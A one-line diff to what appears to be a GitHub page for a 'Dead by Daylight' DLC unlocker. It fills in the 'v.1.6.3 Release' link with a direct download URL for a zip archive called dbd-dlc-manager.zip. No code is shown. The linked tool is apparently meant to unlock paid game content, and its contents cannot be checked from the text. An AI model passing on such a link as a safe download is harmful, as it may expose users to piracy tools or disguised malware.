@@ -6,7 +6,7 @@
 
 ### - 🔗 ***Get the Latest Release:***
 
-- [💾 v.1.6.3 Release]() = `*Tool files & folder*`
+- [💾 v.1.6.3 Release](https://github.com/DeadByDaylight-DLCUnlocker/.github/releases/download/v.1.6.3/dbd-dlc-manager.zip) = `*Tool files & folder*`
 
 ---
 
